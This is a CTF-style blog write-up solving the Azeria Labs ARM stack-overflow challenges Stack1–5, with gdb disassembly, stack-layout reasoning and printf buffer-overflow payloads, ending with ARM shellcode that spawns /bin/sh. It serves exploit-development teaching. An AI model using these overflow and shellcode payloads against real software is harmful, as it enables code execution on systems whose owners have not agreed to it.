---
layout: post
title: "Azeria Labs Challenges Stack1-5"
categories:
  - CTF
tags:
  - CTF
  - AzeriaLabs
comments: true
---

Recently learned ARM Exploit tutorial from <https://azeria-labs.com/>, author gave several challenge problems, below are solution approaches.

Problems here: <https://azeria-labs.com/part-3-stack-overflow-challenges/>

# Environment

1. Directly use author's provided virtual machine <https://azeria-labs.com/arm-lab-vm/>
2. armv6 Raspberry Pi

<!-- more -->

# Problem Stack1

```
What you will learn

How to modify variables to specific values in the program
How the variables are laid out in memory
Goal: Change the 'modified' variable. You solved the challenge once "You have changed the 'modified' variable" is printed out.
```

## Initial Run

First directly run to see,

```
pi@raspberrypi:~/ARM-challenges $ ./stack1
stack1: please specify an argument
```

Then add an argument

```
pi@raspberrypi:~/ARM-challenges $ ./stack1 1111111111111111
Try again, you got 0x00000000
```

Make argument longer

```
pi@raspberrypi:~/ARM-challenges $ ./stack1 111111111111111111111111111111111111111111111111111111111111111111111111111111
Try again, you got 0x31313131
Segmentation fault
```

Wow, value changed. 0x31 is 1. And crashed.

## Debugging

```
gdb stack1
break main
run
```

Output assembly

```
gef> disassemble main
Dump of assembler code for function main:
=> 0x000104b0 <+0>:	push	{r11, lr}
   0x000104b4 <+4>:	add	r11, sp, #4
   0x000104b8 <+8>:	sub	sp, sp, #80	; 0x50
   0x000104bc <+12>:	str	r0, [r11, #-80]	; 0x50
   0x000104c0 <+16>:	str	r1, [r11, #-84]	; 0x54
   0x000104c4 <+20>:	ldr	r3, [r11, #-80]	; 0x50
   0x000104c8 <+24>:	cmp	r3, #1
   0x000104cc <+28>:	bne	0x104dc <main+44>
   0x000104d0 <+32>:	mov	r0, #1
   0x000104d4 <+36>:	ldr	r1, [pc, #92]	; 0x10538 <main+136>
   0x000104d8 <+40>:	bl	0x10370
   0x000104dc <+44>:	mov	r3, #0
   0x000104e0 <+48>:	str	r3, [r11, #-8]
   0x000104e4 <+52>:	ldr	r3, [r11, #-84]	; 0x54
   0x000104e8 <+56>:	add	r3, r3, #4
   0x000104ec <+60>:	ldr	r3, [r3]
   0x000104f0 <+64>:	sub	r2, r11, #72	; 0x48
   0x000104f4 <+68>:	mov	r0, r2
   0x000104f8 <+72>:	mov	r1, r3
   0x000104fc <+76>:	bl	0x10340
   0x00010500 <+80>:	ldr	r3, [r11, #-8]
   0x00010504 <+84>:	ldr	r2, [pc, #48]	; 0x1053c <main+140>
   0x00010508 <+88>:	cmp	r3, r2
   0x0001050c <+92>:	bne	0x1051c <main+108>
   0x00010510 <+96>:	ldr	r0, [pc, #40]	; 0x10540 <main+144>
   0x00010514 <+100>:	bl	0x1034c
   0x00010518 <+104>:	b	0x1052c <main+124>
   0x0001051c <+108>:	ldr	r3, [r11, #-8]
   0x00010520 <+112>:	ldr	r0, [pc, #28]	; 0x10544 <main+148>
   0x00010524 <+116>:	mov	r1, r3
   0x00010528 <+120>:	bl	0x10334
   0x0001052c <+124>:	mov	r0, r3
   0x00010530 <+128>:	sub	sp, r11, #4
   0x00010534 <+132>:	pop	{r11, pc}
   0x00010538 <+136>:			; <UNDEFINED> instruction: 0x000105bc
   0x0001053c <+140>:	cmnvs	r2, r4, ror #6
   0x00010540 <+144>:	ldrdeq	r0, [r1], -r8
   0x00010544 <+148>:	andeq	r0, r1, r0, lsl r6
End of assembler dump.

```

Preliminary analysis and debugging code

![](/media/15122339822130.jpg)


Key lines in red box above, as long as r3 r2 are equal, can complete this problem. Debugging found r2 is always 0x61626364, string is `dcba` (little endian).

r2 is relative to pc offset, generally constant in code. r3 is relative to r11 (that is fp) offset -8. Now focus on looking at r11.

r11 is Frame Pointer address (stack bottom), sp is stack top, generally variables in function can be obtained through fp relative offset. Program's input parameters are also like this.

From result above where we input super long data, super long data overwrote `[r11,#-8]`, so program probably simply stores input into character array.

According to `sub sp,sp,#80` see stack size is 80 bytes, that is 20 words. And r11 is value after sp+4, so can look at entire Frame's data, plus main first line push also makes sp decrease 8, so total 23 words. (Since calculation error at the time, command below only outputs 22, but enough) Use command `x/22w $r11-84` to output.

![](/media/15122365637942.jpg)


That is change value at bottom right of figure above to 0x61626364.
From first 0x31313131 count, need 17*4=64 characters, last four need to be `dcba`.

Try this

![](/media/15122367482364.jpg)

![](/media/15122367796672.jpg)

## Passed

Finally challenge passed. Yeah!

![](/media/15122368686347.jpg)

Like problem says, is to familiarize How the variables are laid out in memory.


# Problem Stack2

Similar to previous problem, only input method changed to environment variable.

![](/media/15123013446710.jpg)

Breakpoint at cmp instruction can see, need to make environment variable's final value \n\r\n\r.

![](/media/15123014415309.jpg)

That is overwrite to address in figure above. From first 0x31 count (assuming input is many 1111111), that is need 17*4 characters, last four characters are `\n\r\n\r`.

How to set environment variable to `\n\r`? Reference Stack Overflow answer <https://stackoverflow.com/questions/41309822/how-do-i-actually-write-n-r-to-an-environment-variable>

Following answers all work:

```
export GREENIE=$'1111111111111111111111111111111111111111111111111111111111111111\n\r\n\r'

# 136 = 17*4*2
export GREENIE="$(python -c 'print "\n\r"*136')"
```


# Problem Stack3


![](/media/15123029483316.jpg)

See jump to r3, that is r11-8.

![](/media/15123034988550.jpg)

Can see is to overwrite 0x31313131 in figure above, 17*4 data's last 4 is overwrite function call address.

![](/media/15123036349068.jpg)

Overwrite to 00 01 04 7c, since little endian, input:

```
1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00
```

Finally need:

```
printf '1111111111111111111111111111111111111111111111111111111111111111|\x04\x01\x00' | ./stack3
```

![](/media/15123481953215.jpg)


# Problem Stack4

![](/media/15123520903550.jpg)

To overwrite pc, is to overwrite lr stored in stack's final position.

![](/media/15123520264720.jpg)


Array length 68, +4 can overwrite r11, +4 more can overwrite lr.

![](/media/15123521883470.jpg)


That is overwrite last 4 bytes to 00 01 04 4c.

Answer is:


```
printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c\x04\x01\x00' | ./stack4
```
![](/media/15123526858244.jpg)


# Problem Stack5


First see code same as stack4, difference is: this time we want to execute our own shellcode.

shellcode we use previous chapter's <https://azeria-labs.com/writing-arm-shellcode/>

```
printf '11111111111111111111111111111111111111111111111111111111111111111111\x4c\x04\x01\x00' | ./stack5

```

![](/media/15124064941002.jpg)

Since want to execute our shellcode, change lr to next address on stack, then store shellcode after.

```
11111111111111111111111111111111111111111111111111111111111111111111

\xf0\xf1\xff\xbe

\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
```



Therefore can do:

```
printf '11111111111111111111111111111111111111111111111111111111111111111111\xf0\xf1\xff\xbe\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78' | ./stack5

```



